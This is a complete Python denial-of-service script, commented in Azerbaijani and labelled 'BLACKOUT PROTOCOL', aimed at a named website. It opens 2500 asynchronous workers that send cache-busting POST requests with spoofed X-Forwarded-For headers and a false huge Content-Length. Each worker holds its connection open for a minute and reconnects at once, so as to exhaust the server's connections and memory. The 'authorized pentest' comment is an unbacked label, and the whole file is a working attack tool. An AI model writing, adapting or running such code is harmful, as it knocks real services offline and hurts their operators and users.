import asyncio
import httpx
import random
import time
import string

# --- AUTHORIZED PENTEST ---
TARGET_URL = "https://streamwin.win"
# Asinxron rejimdə thread limiti yoxdur. 2000-3000 worker rahat işləyir.
WORKERS = 2500 

def r_str(n=12):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

async def blackout_worker(worker_id, client):
    # Bu workerlər birbaşa serverin 'backlog' növbəsini doldurur
    while True:
        try:
            # Cloudflare analitikasını və keşini bypass etmək üçün dinamik path
            url = f"{TARGET_URL}/?v={time.time()}&id={r_str(32)}&q={r_str(50)}"
            
            headers = {
                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(1,6)}.0.0.0",
                "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "99999999", # Serverin yaddaşını sonsuza qədər gözləməyə məcbur et
                "Connection": "keep-alive"
            }

            # SİRR BURADADIR: Bağlantını açırıq və 'stream' rejimində asılı saxlayırıq.
            # Bu, həm portu tutur, həm də serverin RAM-ında yer kilitləyir.
            async with client.stream("POST", url, headers=headers) as response:
                print(f"[*] Port {worker_id} kilitləndi. Sayt blokdadır.", end="\r")
                # Bağlantını 1 dəqiqə ərzində heç bir məlumat göndərmədən saxla (Hanging)
                await asyncio.sleep(60)
                
        except Exception:
            # Bağlantı qırılsan dərhal yenisini açırıq (Persistence)
            await asyncio.sleep(0.01)

async def main():
    print(f"💀 BLACKOUT PROTOCOL INITIALIZED: {TARGET_URL}")
    print("[!] Performance: System-level Asynchronous Multiplexing activated.")
    
    # TCP hüdudlarını və bağlantı limitlərini ləğv edirik
    limits = httpx.Limits(max_connections=None, max_keepalive_connections=None)
    
    async with httpx.AsyncClient(
        http2=True, # HTTP/2 Rapid Reset bypass effekti verir
        verify=False,
        limits=limits,
        timeout=None # Serverin bizi atmasına imkan vermirik
    ) as client:
        
        # Bütün workerləri asinxron şəkildə eyni anda partlat
        workers = [blackout_worker(i, client) for i in range(WORKERS)]
        await asyncio.gather(*workers)

if __name__ == "__main__":
    # Əsas asinxron dövrəni başladırıq (Thread limitinə ilişmədən)
    asyncio.run(main())
